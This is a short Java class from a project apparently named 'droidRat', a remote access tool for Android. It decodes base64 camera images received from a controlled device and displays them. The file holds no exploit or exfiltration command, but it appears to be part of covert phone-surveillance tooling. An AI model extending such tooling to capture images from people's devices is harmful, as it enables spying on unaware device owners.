package com.je_chen.droidRat.module.process.receive.data.process;

import com.je_chen.droidRat.module.process.receive.data.process_super.DataFather;
import com.je_chen.droidRat.module.util.Base64Image;

import javax.swing.*;

public class CameraData extends DataFather {

    private final Base64Image imageProcess;

    public CameraData() {
        imageProcess = new Base64Image();
        JFrame jFrame = new JFrame("圖片");
        jFrame.setSize(500, 500);
    }

    @Override
    public void processData(String[] dataArray) {
        imageProcess.base64String_To_Image(dataArray[2], true);
    }

}
